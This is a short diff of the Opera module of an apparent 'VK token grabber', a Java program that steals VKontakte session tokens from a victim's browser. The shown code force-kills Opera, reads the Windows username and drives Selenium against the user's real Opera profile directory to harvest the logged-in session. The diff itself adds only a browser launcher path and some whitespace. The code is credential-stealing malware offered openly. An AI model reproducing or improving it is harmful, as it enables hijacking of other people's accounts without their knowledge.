@@ -11,7 +11,7 @@ import org.openqa.selenium.remote.DesiredCapabilities;
 
 import com.github.dedinc.vktokengrabber.utils.WebDriver;
 
-public class Opera {
+public class Opera {	
 
 	public static String grabToken() {
 		String username = System.getenv("USERNAME");
@@ -23,8 +23,9 @@ public class Opera {
 			Runtime.getRuntime().exec("taskkill /im opera.exe /f");
 		} catch (Exception e) {
 		}
-		ChromeOptions options = new ChromeOptions();
+		ChromeOptions options = new ChromeOptions();	
 		options.addArguments("user-data-dir=C:\\Users\\" + username + "\\AppData\\Roaming\\Opera Software\\Opera Stable");
+		options.setBinary("C:\\Users\\" + username + "\\AppData\\Local\\Programs\\Opera\\launcher.exe");
 		new DesiredCapabilities();
 		DesiredCapabilities capabilities = DesiredCapabilities.opera();
 		capabilities.setCapability(ChromeOptions.CAPABILITY, options);
